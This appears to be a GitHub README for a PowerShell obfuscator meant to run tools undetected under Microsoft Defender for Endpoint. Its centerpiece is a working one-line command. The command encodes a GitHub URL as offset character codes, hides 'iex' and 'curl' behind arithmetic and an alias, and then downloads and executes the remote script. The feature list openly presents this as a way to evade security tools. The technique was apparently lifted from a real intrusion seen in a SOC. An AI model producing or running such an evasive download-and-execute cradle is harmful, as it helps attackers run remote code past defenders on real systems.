# ps1-obfuscator

![image](https://github.com/user-attachments/assets/39e165b8-0030-4add-a6e0-902afb6f49ee)

A `ps1` obfuscator designed to help run fkmde or other tools for use in environments with Microsoft Defender for Endpoint (MDE).

```
powershell -Command "new-alias ravnl curl; $bcutn = @(8891,8903,8903,8899,8902,8845,8834,8834,8901,8884,8906,8833,8890,8892,8903,8891,8904,8885,8904,8902,8888,8901,8886,8898,8897,8903,8888,8897,8903,8833,8886,8898,8896,8834,8889,8894,8907,8887,8901,8834,8889,8894,8896,8887,8888,8834,8896,8884,8892,8897,8834,8889,8894,8896,8887,8888,8833,8899,8902,8836); $qsnln = ''; foreach ($asciiValue in $bcutn) { $decodedChar=[char]($asciiValue-8787); $qsnln+=$decodedChar; }; .([char](9992-9887)+'e'+'x')(ravnl -useb $qsnln)" 
```

## Features
- **URL Obfuscation**: Transforms URL into a series of ASCII values, making them less recognizable to security tools.
- **Random Variable Generation**: Creates random variable names to further obscure the script and reduce the chance of detection.
- **CMD Compatibility**: The generated obfuscated script can be executed in the Windows Command Prompt, allowing for seamless integration into various workflows.

![image](https://github.com/user-attachments/assets/56a56fe1-c374-4938-a1cb-ab261569151f)

  
## Disclaimer
This tool is intended for educational and security research purposes only. The author is not responsible for misuse or for any damage that may occur from using this tool. It is the end user's responsibility to comply with all applicable laws and regulations. The use of this tool against targets without prior mutual consent is illegal.

## Credits
- This obfuscation technique was observed in a live Security Operations Center (SOC) incident and adapted for red-teaming purposes.
